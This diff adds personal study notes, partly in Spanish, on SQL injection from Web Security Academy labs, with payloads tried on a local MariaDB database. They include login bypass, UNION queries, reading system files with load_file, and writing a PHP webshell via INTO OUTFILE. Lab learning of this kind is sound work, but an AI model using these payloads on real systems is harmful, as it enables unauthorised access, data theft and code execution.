@@ -1,0 +1,47 @@
+
+-- is a comment indicator in SQL
+
++OR+1=1-- # es true y obvia el resto.
+
+eg.
+
+https://insecure-website.com/products?category=Gifts'--
+This results in the SQL query:
+
+SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
+
+https://0a2000a504b3fbc9c0b22b9f00570093.web-security-academy.net/filter?category=Pets'or 1=1-- -
+
+#Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+MariaDB [Twitch]> select suscription from users where username = 'biorg' or 1=1;-- -';
+MariaDB [Twitch]> select suscription from users where username = 'biorg' or 1=1;#';
+
+
+#Lab: SQL injection vulnerability allowing login bypass
+formulario de autentificacion:
+
+username: administrator'-- -
+password: any
+
+#Lab: SQL injection UNION attack, determining the number of columns returned by the query
+MariaDB [Twitch]> select password, suscription from users where username = "txhaka" UNION select version(),database();-- -';
+MariaDB [Twitch]> select password, suscription from users where username = "txhaka" UNION select version(),user();-- -';
+MariaDB [Twitch]> select password, suscription from users where username = "txhaka" UNION select 2,@@version;-- -';
+
+MariaDB [Twitch]> select password, suscription from users where username = "txhaka" UNION select load_file("/etc/hosts"),user();-- -';
+
+https://0a77000b03ffe2c0c05d817600d90037.web-security-academy.net/filter?category=Gifts%27%20union%20select%20NULL,NULL,NULL--%20-
+
+
+#Lab: SQL injection UNION attack, finding a column containing text
+
+MariaDB [Twitch]> select password, suscription from users where username = "txhaka" UNION select "<?php system('whoami');?>","probando" into outfile "/tmp/prueba.txt";-- -';
+Query OK, 2 rows affected, 1 warning (0.002 sec)
+
+#Lab: SQL injection UNION attack, retrieving data from other tables
+MariaDB [Twitch]> select password, suscription from users where username = "txhaka" UNION select 1,schema_name from information_schema.schemata;-- -';
+MariaDB [Twitch]> select password, suscription from users where username = "txhaka" UNION select 1,schema_name from information_schema.schemata limit 3,1;-- -';
+
+
+
+
